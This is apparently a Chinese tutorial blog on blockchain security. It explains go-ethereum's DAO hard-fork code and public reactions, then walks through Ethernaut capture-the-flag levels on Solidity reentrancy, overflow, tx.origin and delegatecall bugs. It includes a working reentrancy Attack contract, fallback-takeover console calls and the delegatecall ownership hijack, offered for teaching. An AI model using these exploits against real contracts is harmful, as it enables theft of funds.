<p>这种 <code>config.DAOForkBlock</code> 开关，类似于互联网公司产品新功能灰度上线的功能开关。在区块链上，可以先实现功能代码逻辑。至于何时启用，则可以在社区、开发者讨论后，确定最终的开启时间。当然区块链上区块高度等价于时间戳，比如 DAO 分叉点 1920000 也是讨论后敲定。</p>
<h3 id="如何分离网络？"><a href="#如何分离网络？" class="headerlink" title="如何分离网络？"></a><strong>如何分离网络？</strong></h3><p>如果分叉后不能快速地分离网络，会导致节点出现奇奇怪怪的问题。这次的 The DAO 分叉处理是通过特定代码拦截实现。不应该让节点同时成为两个阵营的中继点，应分离出两个网络，以让其互不干预。The DAO 硬分叉的处理方式是：节点连接握手后，向对方请求分叉区块头信息。在 15 秒必须响应，否则断开连接。</p>
<p>代码实现是在 <code>eth/handler.go</code> 文件中，在消息层进行拦截处理。节点握手后，开始 15 秒倒计时，一旦倒计时结束，则断开连接。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:300</span><br><span class="line">	p.forkDrop = time.AfterFunc(daoChallengeTimeout, func() &#123;</span><br><span class="line">		p.Log().Debug(&quot;Timed out DAO fork-check, dropping&quot;)</span><br><span class="line">		pm.removePeer(p.id)</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>

<p>在倒计时前，需要向对方索要区块头信息，以进行分叉校验。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:297</span><br><span class="line">	if err := p.RequestHeadersByNumber(daoBlock.Uint64(), 1, 0, false); err != nil &#123;</span><br><span class="line">		return err</span><br><span class="line">	&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">此时，对方在接收到请求时，如果存在此区块头则返回，否则忽略。</span><br><span class="line"></span><br><span class="line">```go</span><br><span class="line">// eth/handler.go:348</span><br><span class="line">	case msg.Code == GetBlockHeadersMsg:  </span><br><span class="line">		var query getBlockHeadersData</span><br><span class="line">		if err := msg.Decode(&amp;query); err != nil &#123;</span><br><span class="line">			return errResp(ErrDecode, &quot;%v: %v&quot;, msg, err)</span><br><span class="line">		&#125;</span><br><span class="line">		hashMode := query.Origin.Hash != (common.Hash&#123;&#125;)</span><br><span class="line">		first := true</span><br><span class="line">		maxNonCanonical := uint64(100) </span><br><span class="line">		var (</span><br><span class="line">			bytes   common.StorageSize</span><br><span class="line">			headers []*types.Header</span><br><span class="line">			unknown bool</span><br><span class="line">		)</span><br><span class="line">		//省略一部分 ...</span><br><span class="line">		return p.SendBlockHeaders(headers)</span><br></pre></td></tr></table></figure>

<p>这样，有几种情况出现。根据不同情况分别处理：</p>
<ol>
<li>有返回区块头：</li>
</ol>
<p>如果返回的区块头不一致，则校验不通过，等待倒计时结束。如果区块头一致，则根据前面提到的校验分叉区块方式检查。校验失败，此直接断开连接，说明已经属于不同分叉。校验通过，则关闭倒计时，完成校验。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:465</span><br><span class="line">if p.forkDrop != nil &amp;&amp; pm.chainconfig.DAOForkBlock.Cmp(headers[0].Number) == 0 &#123; </span><br><span class="line">				p.forkDrop.Stop()</span><br><span class="line">				p.forkDrop = nil</span><br><span class="line"> </span><br><span class="line">				if err := misc.VerifyDAOHeaderExtraData(pm.chainconfig, headers[0]); err != nil &#123;</span><br><span class="line">					p.Log().Debug(&quot;Verified to be on the other side of the DAO fork, dropping&quot;)</span><br><span class="line">					return err</span><br><span class="line">				&#125;</span><br><span class="line">				p.Log().Debug(&quot;Verified to be on the same side of the DAO fork&quot;)</span><br><span class="line">				return nil</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>没有返回区块头：</li>
</ol>
<p>如果自己也没有到达分叉高度，则不校验，假定双方在同一个网络。但我自己已经到达分叉高度，则考虑对方的 TD 是否高于我的分叉块。如果是，则包容，暂时认为属于同一网络。否则，则校验失败。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// eth/handler.go:442 </span><br><span class="line">if len(headers) == 0 &amp;&amp; p.forkDrop != nil &#123; </span><br><span class="line">	verifyDAO := true</span><br><span class="line"></span><br><span class="line">	if daoHeader := pm.blockchain.GetHeaderByNumber(pm.chainconfig.DAOForkBlock.Uint64()); daoHeader != nil &#123;</span><br><span class="line">		if _, td := p.Head(); td.Cmp(pm.blockchain.GetTd(daoHeader.Hash(), daoHeader.Number.Uint64())) &gt;= 0 &#123;</span><br><span class="line">			verifyDAO = false</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	if verifyDAO &#123;</span><br><span class="line">		p.Log().Debug(&quot;Seems to be on the same side of the DAO fork&quot;)</span><br><span class="line">		p.forkDrop.Stop()</span><br><span class="line">		p.forkDrop = nil</span><br><span class="line">		return nil</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="转移资产"><a href="#转移资产" class="headerlink" title="转移资产"></a><strong>转移资产</strong></h3><p>上述所做的一切均为安全、稳定的硬分叉，隔离两个网络。硬分叉的目的是，以人为介入的方式拦截攻击者资产。一旦到达分叉点，则立即激活资产转移操作。首先，矿工在挖到分叉点时，需执行转移操作：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// miner/worker.go:877</span><br><span class="line">func (w *worker) commitNewWork(interrupt *int32, noempty bool, timestamp int64) &#123;</span><br><span class="line">	// ...</span><br><span class="line">// Create the current work task and check any fork transitions needed</span><br><span class="line">	env := w.current</span><br><span class="line">	if w.config.DAOForkSupport &amp;&amp; w.config.DAOForkBlock != nil &amp;&amp; w.config.DAOForkBlock.Cmp(header.Number) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(env.state)</span><br><span class="line">	&#125;</span><br><span class="line">	// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其次，任何节点在接收区块，进行本地处理校验时同样需要在分叉点执行：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">// core/state_processor.go:66</span><br><span class="line">func (p *StateProcessor) Process(block *types.Block, statedb *state.StateDB, cfg vm.Config) (types.Receipts, []*types.Log, uint64, error) &#123;</span><br><span class="line">	//...</span><br><span class="line">	// Mutate the block and state according to any hard-fork specs</span><br><span class="line">	if p.config.DAOForkSupport &amp;&amp; p.config.DAOForkBlock != nil &amp;&amp; p.config.DAOForkBlock.Cmp(block.Number()) == 0 &#123;</span><br><span class="line">		misc.ApplyDAOHardFork(statedb)</span><br><span class="line">	&#125;</span><br><span class="line">	//...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>转移资金也是通过取款合约处理。将 The DAO 合约包括子合约的资金，全部转移到新合约中。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">func ApplyDAOHardFork(statedb *state.StateDB) &#123;</span><br><span class="line">	// Retrieve the contract to refund balances into</span><br><span class="line">	if !statedb.Exist(params.DAORefundContract) &#123;</span><br><span class="line">		statedb.CreateAccount(params.DAORefundContract)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Move every DAO account and extra-balance account funds into the refund contract</span><br><span class="line">	for _, addr := range params.DAODrainList() &#123;</span><br><span class="line">		statedb.AddBalance(params.DAORefundContract, statedb.GetBalance(addr))</span><br><span class="line">		statedb.SetBalance(addr, new(big.Int))</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，合约资金已全部强制转移到新合约。</p>
<hr>
<p>通过以上解决方案，THE DAO投资者的资产获得了保障。但是也引起了不少争议。</p>
<p>Reddit上有人说：</p>
<blockquote>
<p>“以太坊基金会参与DAO项目就是个错误。因为我觉得以太坊应该挑选一些能够成功的项目以及实验来提供基础架构，而反过来它们要想成功，则需要一个强大的基础，而且要求坦诚得面对挑战。硬分叉提议的妥协，破坏了这种坦诚，而且意味着DAO项目会反过来影响它们自己的基础架构。就我而言，这是完全无法接受的，也违背了曾经吸引我的以太坊原则。”<br>硬分叉是一个有效选项，但是它是针对需要紧急整改以太坊协议本身的情况的，而非利用以太坊平台的其他项目。<br>以太坊基金会已经参与进来，而且推广了THE DAO项目，这整个事件就是个错误，它只会损害人们对以太坊作为其他项目基础架构的信任。<br>我希望他们能纠正这个错误。</p>
</blockquote>
<p>也有其他人表示：</p>
<blockquote>
<p>“在头几天我做了个坏决定，然后我损失了2万个以太币，能把这些以太币也还给我吗？先谢谢了！”</p>
</blockquote>
<p>最后：</p>
<blockquote>
<p>“以太坊一直按其目标在运作。我觉得既然现在管用，就不该去更新软件。你可以想象一下你的投资会遭遇的风险。如果你不清楚你的投资情况，那你就会遇到未知的风险。其他任何东西都会是中央权威机构的一种援助，和加密世界形成对照。相似的，这也就是为什么雷曼兄弟会失败——因为交易就是交易，如果你为了某些特定参与者该改变规则，那么其他参与者也会想要这种特殊待遇。”</p>
</blockquote>
<p><strong>项目太大，不能失败</strong></p>
<p>雷曼兄弟事件发生一个月后，其他银行就得到了特殊待遇，你可以自己考量这是否是好事——这和我们现在的情况相似。THE DAO不是一个孤岛。</p>
<p>这个项目太大了，它不能出现问题，这是以太坊生态系统的观点之一。可能大家会注意到，以太坊基金会中也有几个人是DAO代币拥有者及THE DAO项目顾问。甚至是Gavin Wood——以太坊最初创始人之一，也在博客中支持这个分叉。</p>
<p>在他的观点中，很有可能其他大型项目也会需要救助，而以太坊基金会之前已经遇到过先例，可能需要再次要求矿工来重写历史。很明显这和银行救助非常相似：银行要承担大量风险来期待较大回报，而当这些交易出现问题时，纳税人就会“拯救”他们（除了可能的雷曼兄弟）。一般来说，这种风险的不对称性对激励市场参与者来说，不是好办法。</p>
<p>这是两个极端，但是大多数人都会倾向于其中的一个。法律专家都会如此，更别提普通人。</p>
<p>参考：</p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">区块链安全 - DAO攻击事件解析</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/">https://news.bitcoin.com/verge-is-forced-to-fork-after-suffering-a-51-attack/</a></li>
<li><a href="https://link.zhihu.com/?target=https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/">https://news.bitcoin.com/verge-struck-by-second-pow-attack-in-as-many-months/</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/the-verge-hack-explained-part-1">干货 | Verge 攻击解析，Part-1</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32325">干货 | Verge 攻击解析，Part-2</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.8btc.com/article/93713">https://www.8btc.com/article/93713</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/">http://vessenes.com/more-ethereum-attacks-race-to-empty-is-the-real-deal/</a></li>
<li><a href="https://link.zhihu.com/?target=http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/">http://vessenes.com/deconstructing-thedao-attack-a-brief-code-tour/</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011721501/article/details/79450122">https://blog.csdn.net/u011721501/article/details/79450122</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2019/04/07/dao/">https://learnblockchain.cn/2019/04/07/dao/</a></li>
<li><a href="https://link.zhihu.com/?target=http://eips.ethereum.org/EIPS/eip-779">EIP 779: Hardfork Meta: DAO Fork</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.slock.it/hard-fork-specification-24b889e70703">Hard Fork Specification</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/ethereum/go-ethereum/pull/2814">PR#2814-finalize the DAO fork</a></li>
<li><a href="https://link.zhihu.com/?target=http://chainb.com/?P=Cont&id=1290">http://chainb.com/?P=Cont&id=1290</a></li>
</ol>
<h1 id="区块链技术13-区块链安全-2"><a href="#区块链技术13-区块链安全-2" class="headerlink" title="区块链技术13:区块链安全(2)"></a>区块链技术13:区块链安全(2)</h1><p>接下来我们继续看一看以太坊中常见的代码编写的安全问题。下面列出了已知的常见的 Solidity 的漏洞类型：</p>
<ol>
<li>Reentrancy - 重入</li>
<li>Access Control - 访问控制</li>
<li>Arithmetic Issues - 算术问题（整数上下溢出）</li>
<li>Unchecked Return Values For Low Level Calls - 未严格判断不安全函数调用返回值</li>
<li>Denial of Service - 拒绝服务</li>
<li>Bad Randomness - 可预测的随机处理</li>
<li>Front Running</li>
<li>Time manipulation</li>
<li>Short Address Attack - 短地址攻击</li>
<li>Unknown Unknowns - 其他未知</li>
</ol>
<p>为了让本节更有趣，这次课我们尝试使用在线的<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix</a>结合ethernaut看一下上次课的攻击效果。Remix IDE是开发以太坊智能合约的在线IDE工具，部署简单的智能合约非常方便。需要使用谷歌或者火狐的浏览器，且安装了MetaMask 插件。</p>
<p>Ethernaut 是 Zeppelin 提供的一个基于 Web3 和 Solidity 的智能合约审计训练平台，复现了智能合约中可能出现的各种安全问题。现在已经有20+题目。</p>
<ol>
<li>首先，我们直接来看问题10，reentrancy重入问题。这个问题和我们上次讲的问题很像。</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233094.jpg" alt="img"></p>
<p>首先来复习一下这个代码的问题，以及如何可以利用这个漏洞。</p>
<p>有了基本思路之后，可以撰写代码：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      if(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = 0x476a5eebd3587e89d1f4f81b1fa7a724f834a04c;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        return target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        return instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        target.withdraw(0.5 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把以上代码拷贝到remix ide中，编译之后将合约部署到网络上，此时查看，可以看到</p>
<ul>
<li>balance 为 0</li>
<li><code>Reentrance</code> 账户余额 1 ether</li>
<li><code>Attack</code> 账户余额 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233095.jpg" alt="img"></p>
<p>然后调用donate函数，以攻击者合约的身份向题目地址转账 1 ether；首先在value处填写1 ether；</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233096.jpg" alt="img"></p>
<p>然后调用donate函数：</p>
<ul>
<li>balance 为 1</li>
<li><code>Reentrance</code> 账户余额 2 ether</li>
<li><code>Attack</code> 账户余额 0 ether</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233097.jpg" alt="img"></p>
<p>然后开始攻击，调用hack():</p>
<p>效果如下：</p>
<ul>
<li>balance 下溢</li>
<li>Reentrance 账户余额 0 ether</li>
<li>Attack 账户余额 2 ether</li>
</ul>
<p>一般来说，在调用hack的时候会报出不能正确估计gas的问题，尽量多给它一些gas。</p>
<p>如果gas不足，会报错。奇怪的是，居然出现了这种状况：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233098.jpg" alt="img"></p>
<p>如果hack正常工作，那么结果如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233099.jpg" alt="img"></p>
<p>\2. 为了巩固对上一个漏洞的理解，我们来接着看第一关，Fallback。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">import &#x27;zeppelin-solidity/contracts/ownership/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line"></span><br><span class="line">  function Fallback() public &#123;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(this.balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() payable public &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关中，直接给出了源码，然后要求的通关条件是</p>
<ul>
<li>成为合约的 owner</li>
<li>清零 balance</li>
</ul>
<p>合约构造函数 <code>Fallback()</code> 中初始化拥有者贡献度为 1000 ether。<br>我们可以通过转钱提升贡献度，当贡献度超过 1000 ether 即可成为合约 owner。<br>但在 <code>contribute()</code> 中限制了每次只能转小于 0.001 ether 的钱。很明显，此路不通。</p>
<p>那请问应该如何通关呢？</p>
<p>然而成为 owner 还有另一种方式，注意到合约的 fallback 函数，即最下的无名函数。当合约账户收到一笔转账时会自动调用 fallback 函数。在这里，只要转账金额大于0，并且贡献大于0，即可成为 owner。</p>
<p>调用 <code>help()</code> 函数，了解下如何进行转钱操作。还需要注意一下 Wei 和 Ether 的转换。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;value: 1&#125;)</span><br><span class="line">contract.sendTransaction(&#123;value: 1&#125;)</span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure>

<p>这里有另一个问题，如何调用fallback。可以使用instance.sendTransaction({})的方法来触发fallback函数。</p>
<p>\3. 这里继续加深对第一个重入问题的理解，在最后一步hack成功之后，自己账户余额是一个很大的数值。这是怎么回事呢？</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">2**256   = 115792089237316195423570985008687907853269984665640564039457584007913129639936L</span><br></pre></td></tr></table></figure>

<p>这里就涉及到整数的上溢和下溢。</p>
<p>以太坊虚拟机（EVM）为整数指定固定大小的数据类型。这意味着一个整形变量只能表达一定范围的数字。例如，uint8，只能存储[0,255]之间的数字，如果想存储256，那么就会上溢，从而将变量的值变为0。相对应的，如果从一个uint8类型的值为0的变量中减1，就会发生下溢，该变量会变成255。如果不加注意，而且有没有对用户输入执行检查，就有可能发生攻击。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract TimeLock &#123;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; uint) public lockTime;</span><br><span class="line"></span><br><span class="line">    function deposit() public payable &#123;</span><br><span class="line">        balances[msg.sender] += msg.value;</span><br><span class="line">        lockTime[msg.sender] = now + 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function increaseLockTime(uint _secondsToIncrease) public &#123;</span><br><span class="line">        lockTime[msg.sender] += _secondsToIncrease;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt; 0);</span><br><span class="line">        require(now &gt; lockTime[msg.sender]);</span><br><span class="line">        balances[msg.sender] = 0;</span><br><span class="line">        msg.sender.transfer(balances[msg.sender]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这份合约的设计就像是一个时间保险库，用户可以将 Ether 存入合约，并在那里锁定至少一周。而且通过使用increaseLockTime函数，用户可以延长超过1周的时间，但是一旦存放，用户可以确信他们的 Ether 会被安全锁定至少一周。</p>
<p>上述代码有什么问题呢？（lockTime的时间是uint类型）</p>
<p>那我们来看ethernaut的第5关。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  function Token(uint _initialSupply) &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public constant returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样的，可以利用溢出。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233100.jpg" alt="img"></p>
<p>\4. 看完前面几个问题之后，继续看一下其他方面的问题。</p>
<p>第四关telephone。</p>
<p><code>tx.origin</code>是一个address类型，表示交易的发送者，<code>msg.sender</code>则表示为消息的发送者。在同一个合约中，它们是等价的。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233101.jpg" alt="img"></p>
<p>但是在不同合约中，<code>tx.origin</code>表示用户地址，<code>msg.sender</code>则表示合约地址。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract Demo &#123;</span><br><span class="line">    event logData(address);</span><br><span class="line">    </span><br><span class="line">    function a()&#123;</span><br><span class="line">        logData(tx.origin);</span><br><span class="line">        logData(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract Demo2&#123;</span><br><span class="line">    Demo demo222;</span><br><span class="line">    function Demo2(address aimAddr) &#123;</span><br><span class="line">        demo222 = Demo(aimAddr);</span><br><span class="line">    &#125;</span><br><span class="line">    function exp()&#123;</span><br><span class="line">        demo222.a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233102.jpg" alt="img"></p>
<p>这里的0x2b9….69ae就是合约部署之后的地址。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233103.jpg" alt="img"></p>
<p>\5. Access Control 访问控制</p>
<p>访问控制，在使用 Solidity 编写合约代码时，有几种默认的变量或函数访问域关键字：private, public, external 和 internal，对合约实例方法来讲，默认可见状态为 public，而合约实例变量的默认可见状态为 private。</p>
<ul>
<li>public 标记函数或变量可以被任何账户调用或获取，可以是合约里的函数、外部用户或继承该合约里的函数</li>
<li>external 标记的函数只能从外部访问，不能被合约里的函数直接调用，但可以使用 this.func() 外部调用的方式调用该函数</li>
<li>private 标记的函数或变量只能在本合约中使用（注：这里的限制只是在代码层面，以太坊是公链，任何人都能直接从链上获取合约的状态信息）</li>
<li>internal 一般用在合约继承中，父合约中被标记成 internal 状态变量或函数可供子合约进行直接访问和调用（外部无法直接获取和调用）</li>
</ul>
<p>Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 <code>call</code>和 <code>delegatecall</code>：</p>
<ul>
<li><code>call</code> 的外部调用上下文是外部合约</li>
<li><code>delegatecall</code> 的外部调用上下文是调用合约上下文</li>
</ul>
<p>DELEGATECALL基本就是说“我是一个合约，我授权（delegating）你对我的storage做任何事情”。delegatecall的安全问题是它必须要能够信任接收方的合约会善待它的storage。DELEGATECALL是对CALLCODE的改进，因为CALLCODE不保存msg.send和msg.value。譬如如果A调用B，B又DELEGATECALL给C，那么在DELEGATECALL中的msg.sender是A，而在CALLCODE中的msg.sender是B。</p>
<p>如果A使用CALL调用B，那么B的代码的运行上下文就是B；如果A使用DELEGATECALL调用B，那么B的代码的运行上下文是A的上下文。简单的用图表示就是：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233104.jpg" alt="img"></p>
<p>有了这些背景知识，我们来看一下Ethernaut中的题目，第六关delegation。过关要求是要成为合约实例的owner。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.10;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function Delegate(address _owner) &#123;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">    function pwn() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Delegate delegate;</span><br><span class="line"></span><br><span class="line">    function Delegation(address _delegateAddress) &#123;</span><br><span class="line">        delegate = Delegate(_delegateAddress);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    function () &#123;</span><br><span class="line">        if (delegate.delegatecall(msg.data)) &#123;</span><br><span class="line">            this;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路其实是很清晰，因为<code>Delegation</code>合约中的<code>delegatecall</code>函数参数可控，导致可以在合约内部执行任意函数，只需调用<code>Delegate</code>合约中的<code>pwn</code>函数，即可将 owner 变成自己。这里需要注意的问题是，delegatecall的参数问题。不是直接把函数名字传递过去。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233105.jpg" alt="img"></p>
<p>原因是，这里需要知道**Ethereum Virtual Machine(EVM)**如何确定执行合约的哪个函数。合约最后都会被编译成bytecode，而发起一个transaction要执行合约里的某个函数时，交易里的data字段同样也是bytecode而不是人看得懂的函数名称。 以一个简单的合约为例：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">contract Multiply &#123;</span><br><span class="line"></span><br><span class="line">   function multiply(int x, int y) constant returns(int) &#123;</span><br><span class="line"></span><br><span class="line">       return x*y; </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译完的bytecode：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">6060604052341561000c57fe5b5b60ae8061001b6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633c4308a814603a575bfe5b3415604157fe5b605e60048080359060200190919080359060200190919050506074565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820c40f61d36a3a1b7064b58c57c89d5c3d7c73b9116230f9948806b11836d2960c0029</span><br></pre></td></tr></table></figure>

<p>如果要执行multiply函数，算出8*7等于多少，transaction里的data字段会是</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x3c4308a800000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000007</span><br></pre></td></tr></table></figure>

<p>分成三个部分： 第一个是四个byte的3c4308a8，第二和第三个分别是32 byte长的参数，8和7。</p>
